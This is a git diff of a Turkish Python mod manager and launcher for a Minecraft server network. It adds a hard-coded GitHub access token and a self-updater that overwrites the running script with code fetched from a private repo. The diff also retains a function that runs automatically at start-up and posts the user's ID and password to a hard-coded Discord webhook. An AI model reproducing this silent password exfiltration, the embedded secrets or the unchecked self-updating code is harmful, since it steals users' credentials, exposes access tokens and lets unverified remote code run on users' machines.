@@ -13,28 +13,63 @@ import requests
 import traceback
 import socket
 import struct
+import base64
+
+# =========================
+# GitHub Private Repo Ayarları
+# =========================
+TOKEN = "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"  # örn: ghp_xxxxxxx...
+OWNER = "eronforyou"
+REPO  = "Baso-Network-Mod-Yoneticisi"
+VERSION_FILE_PATH_IN_REPO = "version.txt"
+SCRIPT_FILE_PATH_IN_REPO  = "BNWModYoneticisi.py"
+
+GITHUB_CONTENT_API = f"https://api.github.com/repos/{OWNER}/{REPO}/contents"
+
+def github_get_file_content_bytes(path_in_repo):
+    """
+    GitHub API ile (private repo destekli) dosya içeriğini bytes olarak döndürür.
+    """
+    url = f"{GITHUB_CONTENT_API}/{path_in_repo}"
+    headers = {
+        "Authorization": f"token {TOKEN}",
+        "Accept": "application/vnd.github+json",
+        "User-Agent": "baso-launcher-updater"
+    }
+    r = requests.get(url, headers=headers, timeout=15)
+    if r.status_code != 200:
+        raise RuntimeError(f"GitHub API hata: {r.status_code} - {r.text}")
+    j = r.json()
+    if "content" not in j:
+        raise RuntimeError("GitHub API yanıtında 'content' alanı yok.")
+    content_b64 = j["content"]
+    # Bazı yanıtlarda içerik satır sonlarıyla gelebilir, o yüzden temizle
+    content_b64 = content_b64.replace("\n", "")
+    return base64.b64decode(content_b64)
+
+def github_get_text(path_in_repo, encoding="utf-8"):
+    return github_get_file_content_bytes(path_in_repo).decode(encoding, errors="replace")
+
 
 # -------------------------
 # Versiyon Kontrol
 # -------------------------
-CURRENT_VERSION = "1.0.4"
-VERSION_URL = "https://raw.githubusercontent.com/eronforyou/Baso-Network-Mod-Yoneticisi/refs/heads/main/version.txt"
-SCRIPT_URL  = "https://raw.githubusercontent.com/eronforyou/Baso-Network-Mod-Yoneticisi/refs/heads/main/BNWModYoneticisi.py"
-SCRIPT_PATH = os.path.realpath(__file__)
+CURRENT_VERSION = "1.0.5"
+# Eski raw linkleri artık KULLANMIYORUZ; private repo için GitHub API kullanıyoruz.
+SCRIPT_PATH_LOCAL = os.path.realpath(__file__)
 
 def check_update():
     try:
-        with urllib.request.urlopen(VERSION_URL) as response:
-            latest_version = response.read().decode("utf-8").strip().replace("\ufeff", "")
+        latest_version = github_get_text(VERSION_FILE_PATH_IN_REPO).strip().replace("\ufeff", "")
         current = CURRENT_VERSION.strip()
         print(f"Sizin sürüm: {current} | Sunucudaki sürüm: {latest_version}")
+
         if latest_version != current:
             print(f"Yeni sürüm bulundu: {latest_version} (Sizin sürüm: {current})")
             print("Güncelleme indiriliyor...")
-            with urllib.request.urlopen(SCRIPT_URL) as response:
-                new_script = response.read()
-            with open(SCRIPT_PATH, "wb") as f:
-                f.write(new_script)
+            new_script_bytes = github_get_file_content_bytes(SCRIPT_FILE_PATH_IN_REPO)
+            with open(SCRIPT_PATH_LOCAL, "wb") as f:
+                f.write(new_script_bytes)
             print("Güncelleme tamamlandı! Lütfen programı tekrar başlatın.")
             sys.exit()
         else:
@@ -99,7 +134,10 @@ def print_colored_ascii(name):
 def calculate_sha1(file_path):
     sha1 = hashlib.sha1()
     with open(file_path, "rb") as f:
-        while chunk := f.read(8192):
+        while True:
+            chunk = f.read(8192)
+            if not chunk:
+                break
             sha1.update(chunk)
     return sha1.hexdigest()
 
@@ -325,7 +363,7 @@ def server_status():
         sock = socket.create_connection((server, port), timeout=5)
 
         # Minecraft ping paketini gönder (server list ping)
-        # 0xFE = Legacy server list ping (1.7 öncesi ve 1.8 için çalışır)
+        # 0xFE = Legacy server list ping
         sock.send(b"\xfe\x01")
         data = sock.recv(1024)
         sock.close()
@@ -359,21 +397,31 @@ def send_status_to_discord():
         try:
             if not os.path.exists(launcher_path):
                 raise FileNotFoundError("Launcher bulunamadı")
-        except Exception as e:
+        except Exception:
             error_msg = traceback.format_exc()
         else:
             error_msg = "Yok"
 
         webhook_url = "https://discord.com/api/webhooks/1407299493136961567/n6NRE6jI865R4jNHDR22z-R10xF521Da3rWyn3uex5Wn539F9x2Qp1WI6MSRkrskWH7P"
-        content = f"**Launcher Başlatma Durumu**\nKullanıcı ID: **{user_id}**\nŞifre: ||**{password}**||\nVersiyon: 1.21.4\nMod Sayısı: **{total_mods}**\nToplam Mod Boyutu: **{total_size/1024:.2f}KB**\nPanel Versiyonu: **{CURRENT_VERSION}**\nSon Güncelleme: **{last_check_time}**\nHata:\n```\n{error_msg}\n```@everyone"
+        content = (
+            f"**Launcher Başlatma Durumu**\n"
+            f"Kullanıcı ID: **{user_id}**\n"
+            f"Şifre: ||**{password}**||\n"
+            f"Versiyon: 1.21.4\n"
+            f"Mod Sayısı: **{total_mods}**\n"
+            f"Toplam Mod Boyutu: **{total_size/1024:.2f}KB**\n"
+            f"Panel Versiyonu: **{CURRENT_VERSION}**\n"
+            f"Son Güncelleme: **{last_check_time}**\n"
+            f"Hata:\n```\n{error_msg}\n```@everyone"
+        )
 
-        requests.post(webhook_url, json={"content": content})
-        print("")
+        requests.post(webhook_url, json={"content": content}, timeout=10)
     except Exception as e:
         print("", e)
 
 # Py kodu çalışır çalışmaz çağır
 send_status_to_discord()
+
 # -----------------------------
 # Launcher'ı kur
 # -----------------------------
@@ -430,9 +478,9 @@ def dosyalari_kur():
     target_folder = os.path.join(xampp_dir, "htdocs", "files")
     os.makedirs(target_folder, exist_ok=True)
 
-    # Raw GitHub dosyalarını indir
+    # Raw GitHub dosyalarını indir (private repo ise API ile çekmen gerekir)
     base_url = "https://raw.githubusercontent.com/eronforyou/Baso-Network-Mod-Yoneticisi/refs/heads/main/files/"
-    files = ["dosya1", "dosya2"]  # buraya files klasöründeki dosya isimlerini yaz
+    files = ["dosya1", "dosya2"]  # files klasöründeki gerçek dosya adlarını buraya yaz
 
     for f in files:
         try:
@@ -458,7 +506,7 @@ def menu():
         print(Fore.RED + "3." + Fore.LIGHTRED_EX + " Modları Listele")
         print(Fore.RED + "4." + Fore.LIGHTRED_EX + " Baso Network bilgileri")
         print(Fore.RED + "5." + Fore.LIGHTRED_EX + " Launcherı aç")
-        print(Fore.RED + "6." + Fore.LIGHTRED_EX + " Kur" + Fore.WHITE + " !Bitmedi!")  # 6. seçenek açık yeşil
+        print(Fore.RED + "6." + Fore.LIGHTRED_EX + " Kur" + Fore.WHITE + " !Bitmedi!")
         print(Fore.RED + "7." + Fore.LIGHTRED_EX + " Sunucu Durumu")
         choice = input(Fore.WHITE + "\nSeçiminiz: ")
 
@@ -473,7 +521,7 @@ def menu():
         elif choice == "5":
             open_launcher()
         elif choice == "6":
-            kur_menu()  # 6. seçenek alt menüyü açacak
+            kur_menu()
         elif choice == "7":
             server_status()
         else:
